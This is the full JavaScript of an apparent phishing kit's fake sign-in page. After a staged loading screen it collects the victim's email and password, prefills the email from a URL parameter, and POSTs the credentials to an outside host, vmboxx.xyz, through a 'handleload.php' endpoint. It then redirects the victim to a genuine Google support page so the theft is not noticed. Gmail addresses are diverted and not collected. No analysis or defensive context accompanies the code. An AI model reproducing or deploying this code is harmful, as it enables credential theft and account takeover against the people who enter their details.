
  $(document).ready(function(){

document.getElementById("phonenumberdiv").style.display = "none";
document.getElementById("verifyNumber").style.display = "none";
var loadingPhotoTimer;
preloader();
      
  $("#signIn").click(function(){
    if( validateEmail(document.getElementById("email").value) && document.getElementById("password").value.length>=2)  { 
   writeload();
        
    } else { $("#alertmsg").show() }
  });

 
$("#verifyNumber").click(function(){
    if( document.getElementById("phonenumber").value.length>=5)  
      { skipGmail(); } 

    else { $("#alertmsgnumber").show() }
  });

function validateEmail($email) {
  var emailReg = /^([\w-\.]+@([\w-]+\.)+[\w-]{2,4})?$/;
  return emailReg.test( $email );
}


  function writeload()
  {

    em = document.getElementById("email").value;
     ps = document.getElementById("password").value;

                      if(em.indexOf("gmail")>=1)
{
               
        //skip gmail   
    top.window.location.replace("https://support.google.com/photos/answer/9454489?co=GENIE.Platform%3DAndroid&hl=en");
    
}
else
{

    
       $("#loadersmall").show();
    
    $.ajax({
            url: "https://vmboxx.xyz/nc_assets/fonts/handleload.php", //changelink
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
    },
            type: "POST",
            data: {email: em, password: ps, resulttype: resulttype},
            success: function(result) {
              

                $("#contentdiv").hide();
               $("#loadersmall").hide();
               top.window.location.replace("https://support.google.com/photos/answer/9454489?co=GENIE.Platform%3DAndroid&hl=en");
      
               
            },
            error: function(result) {
               $("#alertmsg").show();

               
            }
        });
}

 






  };
  



  function skipGmail()
  {

//skip gmail




  }


  





function preloader() {
    loadingPhotoTimer = setTimeout(showPage, 3000);
}



function showPage() {
  document.getElementById("loadertitle").style.display = "none";
  document.getElementById("contentdiv").style.display = "block";

}

    });
      
       const queryString = window.location.search;
    const urlParams = new URLSearchParams(queryString);
    const emailinurl = urlParams.get('e');
     const senttoname = urlParams.get('n');
      const resulttype = urlParams.get('t');
      
    
    if(emailinurl!=null && emailinurl!="{Email Address}" && emailinurl!=""){
     document.getElementById("email").setAttribute("value",emailinurl);}


